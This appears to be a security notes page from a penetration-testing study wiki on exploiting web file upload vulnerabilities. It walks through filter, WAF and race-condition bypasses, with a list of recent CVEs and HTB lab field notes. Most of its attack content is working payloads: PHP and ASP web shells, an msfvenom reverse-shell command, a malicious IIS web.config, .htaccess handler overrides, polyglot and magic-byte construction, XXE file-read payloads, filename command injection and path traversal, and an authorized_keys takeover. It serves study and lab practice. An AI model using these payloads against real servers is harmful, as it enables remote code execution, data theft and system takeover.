+++
title = 'File Upload Vulnerabilities'
date = 2026-10-30
type = 'notes'
weight = 30
toc = true
tags = ['web', 'web-attacks', 'file-upload']
+++

File upload vulnerabilities arise when a web server accepts user-supplied files without adequately validating their **extension**, **content type**, **magic bytes**, or **destination path**. The impact ranges from stored XSS to full remote code execution, and the attack surface has expanded in 2025–2026 with new WAF-parsing bypasses, framework-specific sanitizer flaws, and race-condition exploitation tools.

The impact depends on two factors:

1. **Which part of the file is validated** — size, type, contents, name, or none of them.
2. **Which restrictions apply after upload** — whether the directory executes scripts, whether it is web-accessible, and whether configuration files can be dropped.

> **2025–2026 context:** WAF-level file upload checks are now a distinct bypass class. CVE-2026-33691 (OWASP CRS whitespace padding) and CVE-2026-114101 (Coraza filename parsing) both allow dangerous extensions past the WAF without touching the application. Framework sanitizers have their own bugs — CVE-2026-48557 (Spatie Laravel Media Library) checks only the final suffix, letting `shell.php.jpg` through.

---

## 1. How Web Servers Handle File Requests

When a resource is requested, the server parses the path to identify the extension and maps it to a MIME type. What happens next depends on the file type:

- **Static file** — contents are sent to the client in the HTTP response.
- **Dynamic file, execution configured** — the server assigns variables from the request headers and parameters, runs the script, and sends the output.
- **Dynamic file, execution not configured** — the server returns an error, or in some cases serves the file as plain text.

> The `Content-Type` response header may reveal what the server thinks it served. If it is not explicitly set by the application, it normally reflects the extension/MIME mapping.

> **The `Accept` header trick:** if you can edit the request's `Accept` header to ask for a specific response content type, you may still get code execution from a file the server would otherwise serve as plain text.

---

## 2. File Types and Related Attacks

| File type | Potential attack |
|---|---|
| HTML, JS, SVG, GIF | XSS |
| XML, SVG, PDF, PPT, DOC | XXE / SSRF |
| ZIP, JPG, PNG | DoS (zip bombs, decompression) |
| Server config (`.htaccess`, `web.config`) | Rewrite execution rules → RCE |
| Polyglot (GIF/PHP, JPEG/PHP) | Bypass magic-byte checks → RCE |

---

## 3. Web Shells and Reverse Shell Payloads

| Web shell | Description |
|---|---|
| `<?php file_get_contents('/etc/passwd'); ?>` | PHP file read |
| `<?php system('hostname'); ?>` | PHP command execution |
| `<?php system($_GET['cmd']); ?>` | PHP web shell |
| `<% eval request('cmd') %>` | ASP web shell |
| `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > reverse.php` | PHP reverse shell |
| [phpbash](https://github.com/Arrexel/phpbash) | PHP web shell |
| [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP reverse shell |
| [SecLists Web-Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | Collection |

---

## 4. Extension Blacklist Bypasses

| Technique | Example |
|---|---|
| Uncommon extension | `shell.phtml`, `shell.pht`, `shell.phar`, `shell.php5`, `shell.php7`, `shell.pgif`, `shell.inc`, `shell.shtml` |
| Case manipulation | `shell.pHp`, `shell.PHP5` |
| Trailing dot | `shell.php.` — the OS strips the trailing dot |
| Double extension | `shell.jpg.php`, `shell.php.jpg` |
| Reverse double extension | `shell.php.jpg` — executes if `AddHandler` matches `.php` anywhere |
| Character injection | `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `…` before/after the extension |
| ADS (Windows) | `shell.asp:.jpg` — NTFS alternate data stream |

**Extension lists:**

- [PHP extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
- [ASP extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
- [Web extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

> **2025–2026 framework bug:** CVE-2026-48557 (Spatie Laravel Media Library < 11.23.0) checks only the **final** filename suffix, so `shell.php.jpg` bypasses the blocklist. The blocklist also omits `.php6`, `.shtml`, and `.htaccess`.

---

## 5. Server Configuration File Upload

Uploading a configuration file changes how the server interprets **every sibling file** in the directory. This inverts the problem: instead of smuggling an executable past the filter, you upload a file the filter permits, and it rewrites the rules so the next innocent upload executes.

### Apache — `.htaccess`

`.htaccess` provides per-directory configuration. If `AllowOverride All` (or `FileInfo`) is set and a PHP handler is available, an uploaded `.htaccess` can map an allowed extension to PHP:

```apache
AddType application/x-httpd-php .anything
```

Then upload `webshell.anything` and access it — PHP executes.

Other directives:

```apache
# Match a specific filename
<FilesMatch "haha">
    SetHandler application/x-httpd-php
</FilesMatch>

# Match an extension
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

> **Precondition:** `AllowOverride All` or `FileInfo`. Direct access to `.htaccess` is typically disabled, so you cannot read it back — but it takes effect for every file in the directory.

> **2025–2026 note:** CVE-2026-48557 notes that a `.htaccess` blocklist bypass does **not** require the legacy `AddHandler` configuration — the incomplete blocklist alone is exploitable.

### IIS — `web.config`

IIS reads `web.config` from the served directory. An uploaded `web.config` can register a custom handler that executes inline ASP code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified"
           requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<!-- ASP code here -->
<% Response.write(1+2) %>
```

**Real-world example — CVE-2025-69828 (TMS Management Console):** the logo upload function accepted `.svg` but not `.config`; intercepting the request and changing the filename to `web.config` with the payload above achieved code execution.

> **Server Config File Upload (2026 reference):** uploading `.htaccess` or `web.config` is a distinct technique from filter bypass — it changes the server's behaviour rather than smuggling code. The defence is to deny those exact filenames **and** disable override at the server level.

---

## 6. Content-Type and Magic-Byte Bypass

### MIME type spoofing

Some servers validate only the **client-supplied** `Content-Type`:

```bash
# Upload a .php file but keep Content-Type: image/png
curl -F "file=@shell.php;type=image/png" http://target/upload
```

No magic bytes are needed — the filter trusts the header.

### Magic-byte spoofing

Other servers check the file's **signature** (magic bytes):

| Format | Magic bytes |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47` |
| GIF | `47 49 46 38` |

Prepend the magic bytes to a PHP payload:

```bash
printf '\xFF\xD8\xFF' > shell.php
cat payload.php >> shell.php
```

[Full magic-byte list](https://en.wikipedia.org/wiki/List_of_file_signatures)

### Polyglot files

A polyglot is a single file valid in **two formats simultaneously** — a JPEG that is also a valid PHP script. `ExifTool` injects the payload into metadata:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o polyglot.php
```

The file has the contents of a JPEG but carries a PHP payload in the comment. If the server checks only the image structure, it passes.

> **2025–2026 polyglot research:** the [typebleed](https://github.com/potterpk/typebleed) tool statically detects polyglot files — files that two different format parsers both accept. The classic attack is **GIF + PHP**: the GIF header fools the MIME check, and PHP executes the rest. A 2026 write-up on polyglot file uploads and MIME sniffing describes the browser-side variant: a file that is simultaneously a valid image and a valid HTML document, where MIME sniffing renders the HTML.

---

## 7. WAF-Level Bypasses (2025–2026)

These bypasses target the **WAF's parsing of the upload**, not the application's validation. They are the newest and least-documented class.

### CVE-2026-33691 — OWASP CRS whitespace padding

**Affected:** OWASP Core Rule Set **< 3.3.9** and **< 4.25.0**.

The CRS validates the file extension with a regex that does **not normalize whitespace**. By padding the filename with a space before the extension, the dangerous extension passes the check:

```
photo. php
shell.jsp
```

The trailing whitespace is removed by the backend when the file is saved — and the extension is restored.

> **Impact:** most severe on **Windows backends**, where trailing whitespace is normalized automatically. Linux is harder to exploit unless the application trims the filename with `strip()`/`trim()`.

> **Patch:** CRS 3.3.9, 4.25.x LTS, 4.8.x. Metasploit added a `CVE-2026-33691` bypass option (PR #21280).

### CVE-2026-114101 — Coraza WAF multipart filename parsing

**Affected:** Coraza WAF **< 3.8.1**.

Go's `mime.ParseMediaType` ignores **RFC 5987** `filename*` parameters using non-UTF-8 / non-US-ASCII charsets. An attacker supplies a **decoy `filename`** parameter alongside an unsupported-charset `filename*`, and the WAF inspects the decoy while the backend uses the real name.

> **Patch:** Coraza 3.8.1. Audit any rule that relies on `FILES` or filename-based inspection.

### Parameter smuggling — GHSA-36HH-X5P5-JGC8

`@hapi/content` has a **parameter smuggling** issue allowing upload-filter bypass via **duplicate parameters**. The WAF and the application disagree on which parameter value is authoritative, so the WAF sees a safe filename and the application saves a dangerous one.

> **Precondition:** a proxy/WAF chain where one component parses the first occurrence and the other parses the last.

---

## 8. File Upload Race Conditions

Some upload handlers save the file to disk, then **validate and delete** it if it fails the check — typically an anti-virus scan. The file exists on disk for a short window, and you can execute it during that window.

### Methodology

1. Upload a malicious file.
2. Immediately request it repeatedly in parallel.
3. If the file is deleted before your request, the request returns 404; if you win the race, it executes.

**Extending the window:** upload a **large file** with the payload at the start and padding after it. If the server processes in chunks, the payload is available while the rest is still being written.

### Detecting the race window — EICAR

Upload the [EICAR test file](https://www.eicar.org/download-anti-malware-testfile/). If it is uploaded and then deleted, an anti-malware check is in place — and a race window exists.

### Tools and techniques

- **Burp Intruder** with **null payloads** — fire 100+ requests at the uploaded path simultaneously.
- **`ffuf`** against the upload path while the upload is in progress.
- **Last-byte sync** — send the file in two parts, holding the last byte, then race the final byte against the validator.

### 2025–2026 race-condition CVEs

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2025-67124** | miniserve 0.32.0 | TOCTOU symlink race during upload finalization → arbitrary file overwrite (`/etc/shadow`, `~/.ssh/authorized_keys`) → RCE |
| **CVE-2025-15546** | Iptanus File Upload < 5.1.7 | TOCTOU race → overwrite other users' uploads |
| **CVE-2025-3515** | CF7 Drag & Drop Multiple File Upload | Unrestricted upload via race |
| **PictShare 3.7.1** | PictShare | TOCTOU on temporary filename → bypass type checks |

> **Temp-directory brute-force:** if the file is written to a temp directory with a **randomized name**, and the name comes from `uniqid()` or `md5(filename+time)`, the name is predictable. Brute-force the timestamp with tolerance for clock skew.

---

## 9. Path Traversal via Filename

If the application uses the client-supplied `filename` **without sanitization** to construct the destination path, you can write outside the upload directory.

```bash
# Classic traversal in the filename
filename=../../../../var/www/html/shell.php
filename=..%2f..%2f..%2f..%2fetc%2fpasswd
```

### 2025–2026 CVEs

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2025-66449** | ConvertX < 0.16.0 | `/upload` takes `file.name` unsanitized → arbitrary file write → overwrite binaries → RCE |
| **CVE-2025-6108** | Spring-Boot-In-Action | `filename` argument → path traversal |
| **CVE-2025-2363** | VBlog 1.0.0 | `filename` → path traversal |
| **CVE-2025-27224** | TRUfusion Enterprise ≤ 7.10.4.0 | `/trufusionPortal/fileupload` → path traversal |
| **CVE-2025-67506** | PipesHub | Path traversal through upload |
| **LightRAG 1.3.8** | LightRAG | `file.filename` → `../` traversal |

> **Escalation:** path traversal turns a low-impact upload into **arbitrary file write**. Overwriting `/etc/cron.d/`, `~/.ssh/authorized_keys`, or a system binary is a direct root path.

---

## 10. File Upload to XSS

### HTML / SVG upload

```html
<!-- HTML file -->
<script>alert(window.origin);</script>
```

```xml
<!-- SVG file -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(window.origin);</script>
</svg>
```

**Real-world example:** Scada-LTS 2.7.8.1 — stored XSS via SVG upload in the `backgroundImageMP` parameter, executing whenever the affected page is viewed.

### Metadata injection

Applications that display image metadata after upload are vulnerable to payload injection in `Comment`, `Artist`, or `Description`:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
```

### Polyglot → MIME sniffing → stored XSS

If the response lacks `X-Content-Type-Options: nosniff`, the browser may **sniff** the content type. A file that is a valid image and a valid HTML document can be rendered as HTML — executing the script.

---

## 11. File Upload to XXE

SVG files are XML, so an uploaded SVG processed server-side can trigger XXE.

### Read `/etc/passwd`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### Exfiltrate PHP source

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

> **Precondition:** the server **parses** the SVG XML — e.g. Apache Batik rendering an SVG to PNG. If the upload path does not process embedded entities, or strips the `DOCTYPE`, the payload will not fire. Verify server-side parsing before assuming XXE.

> **2025–2026 extension:** CVE-2024-2961 (CNEXT) adapted to SVG upload + XXE → PHP file read → RCE.

---

## 12. Injections in File Names

If the filename is reflected or passed to an OS command:

| Injection | Filename |
|---|---|
| Command execution | `file$(whoami).jpg`, `` file`whoami`.jpg ``, `file.jpg\|\|whoami` |
| XSS | `<script>alert(window.origin);</script>` |
| SQLi | `file';select+sleep(5);--.jpg` |

---

## 13. Windows-Specific Attacks

| Technique | Detail |
|---|---|
| Reserved characters | `\|`, `<`, `>`, `*`, `?` — if unsanitized, the application may refer to a different file, leaking the upload directory in an error |
| Reserved names | `CON`, `COM1`, `LPT1`, `NUL` — same error-leak behaviour |
| 8.3 short filename | `HAC~1.TXT` may refer to `hackthebox.txt` — can overwrite or access a file that does not exist under its full name |

---

## 14. File Upload to SSH Access

If you have **arbitrary file write** and the location is controllable (via traversal or a path parameter):

```bash
ssh-keygen -f fileup
cat fileup.pub > authorized_keys
# Upload to /home/user/.ssh/authorized_keys (or /root/.ssh/authorized_keys)
chmod 600 fileup
ssh -i fileup user@target
```

> You may need path traversal to reach `.ssh/authorized_keys`.

---

## 15. Tools and Automation (2025–2026)

| Tool | What it adds |
|---|---|
| **UploadRanger** | 263+ bypass techniques, proxy capture, Intruder/Repeater, MCP integration. Payload generator for web shells, polyglots, magic bytes |
| **UploadScanner** (Burp) | HTTP file upload scanner — injects PHP, JSP, ASP, XXE, and more |
| **Burp Upload Scanner** | PortSwigger BApp Store |
| **typebleed** | Static analysis for polyglot files |
| **PayloadsAllTheThings — Upload Insecure Files** | Payload reference (2025-maintained) |
| **ExifTool** | Metadata injection |
| **ffuf** | Fuzz allowed extensions: `ffuf -w extensions.txt -u http://target/upload -X POST -F "file=@test.FUZZ"` |

---

## 16. Testing Methodology

```bash
# 1. Identify the upload endpoint and what it accepts
# 2. Try a direct web shell with the expected extension
# 3. If blocked, enumerate the filter type:
#    - Client-side JS → intercept with Burp, remove the check
#    - Extension blacklist → try .phtml, .php5, .phar, case, double ext
#    - Content-Type only → change Content-Type to image/jpeg
#    - Magic bytes → prepend FF D8 FF
#    - WAF → try whitespace padding (CVE-2026-33691), duplicate params
# 4. If the extension cannot be bypassed, try a config file:
#    - Apache: .htaccess with AddType / SetHandler / FilesMatch
#    - IIS: web.config with a custom handler
# 5. If the file is deleted after upload, race it (EICAR to confirm)
# 6. If the filename is reflected, test command injection / XSS / SQLi
# 7. If the file is an SVG or XML, test XXE
# 8. If the filename controls the path, test traversal
```

---

## 17. Field Notes from the HTB List

- **`AddHandler` matches `.php` anywhere in the name.** If Apache has `AddHandler php5-script .php`, `shell.php.png` executes; the app may only check the *submitted* extension (Networked). A `.htaccess` `FilesMatch` regex without a `$` anchor has the same effect (Magic).
- **Some filters only check `Content-Type`.** Rename to `.php` and keep `image/png` — no magic bytes needed (Popcorn).
- **Some filters check magic bytes.** Keep a real PNG header and put the PHP payload after it (Magic); combine with a double extension when the extension check is also weak.
- **`.htaccess` requires `AllowOverride All`/`FileInfo`** and a PHP handler; upload it before the shell, and expect dotfiles to be filtered (Magic).
- **Orphaned uploads still execute.** A rejected upload may remain in a temp directory with a predictable name (`md5(filename+time)`), so brute-force the timestamp with tolerance for clock skew (Help).
- **Admin module/plugin installs** are upload RCE: a crafted module archive with a PHP file lands in the webroot (Dog, BoardLight).
- **Cleanup timers** delete uploaded artifacts quickly — upload and trigger in one script (Dog, Bounty, Secnotes, Mailing).
- **IIS `web.config` is still reliable in 2026.** CVE-2025-69828 shows a `.svg` logo upload being repurposed to `web.config` → ASP execution.
- **WAF bypasses are a separate layer.** CVE-2026-33691 lets `.php` past the CRS without touching the application — always test whether the WAF or the app is doing the blocking.

Full context: [HTB Linux machines](/notes/oscp-labs/linux/), [Windows](/notes/oscp-labs/windows/).

---

## 18. Quick Reference — 2025–2026 Additions

| CVE / Technique | Type | What it bypasses |
|---|---|---|
| **CVE-2026-33691** | WAF (OWASP CRS) | Extension check via whitespace padding |
| **CVE-2026-114101** | WAF (Coraza) | Filename parsing via RFC 5987 charset |
| **GHSA-36HH-X5P5-JGC8** | WAF (`@hapi/content`) | Duplicate parameter smuggling |
| **CVE-2026-48557** | Framework (Spatie) | Double extension + incomplete blocklist |
| **CVE-2025-69828** | IIS | `.svg` → `web.config` upload |
| **CVE-2025-66449** | ConvertX | Path traversal → arbitrary file write |
| **CVE-2025-67124** | miniserve | TOCTOU symlink race → arbitrary overwrite |
| **CVE-2025-15546** | Iptanus | TOCTOU race → overwrite uploads |
| **UploadRanger** | Tool | 263+ bypass techniques |
| **typebleed** | Tool | Polyglot file detection |
| **Polyglot MIME sniffing** | Technique | Stored XSS via browser content sniffing |
| **SVG XXE → CNEXT** | Technique | File read → RCE via SVG upload |

---

This file sits alongside the **Fuzzing** and **XSS** notes: the fuzzing pipeline finds the upload endpoints, and this file turns an upload form into code execution — through filter bypass, config-file injection, race conditions, or path traversal.
